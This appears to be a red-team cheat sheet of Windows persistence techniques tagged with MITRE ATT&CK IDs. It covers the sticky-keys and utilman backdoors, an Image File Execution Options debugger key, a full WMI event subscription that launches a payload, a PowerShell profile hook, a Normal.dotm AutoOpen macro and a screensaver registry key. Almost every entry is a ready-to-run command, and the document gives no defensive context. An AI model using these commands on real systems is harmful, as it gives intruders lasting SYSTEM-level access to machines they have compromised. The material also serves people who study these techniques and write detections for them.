# Other Persistence Techniques

## Sticky Keys Backdoor (T1015)
- Replace sethc.exe with cmd.exe (change ownership from TrustedInstaller first)
- Hit Shift 5 times on logon screen to get SYSTEM shell
- Also works with utilman.exe (Win+U on logon screen)

## Image File Execution Options (T1183)
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
```

## WMI Event Subscription (T1084)
```powershell
# Create filter (trigger on boot after 20min uptime)
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='evil'; EventNamespace='root\CIMV2'; QueryLanguage='WQL'
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1200"
}
# Create consumer
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name='evil'; ExecutablePath="C:\payload.exe"}
# Bind
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer}
```

## PowerShell Profile
```powershell
echo "Start-Process c:\payload.exe" > $PROFILE
```
- Runs on every PowerShell launch; bypassed with `powershell -nop`

## Office Templates
- Edit Normal.dotm at `%APPDATA%\Microsoft\Templates\`
- Add AutoOpen macro; fires on every new Word document creation

## Screensaver Persistence
```cmd
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "c:\payload.exe"
```
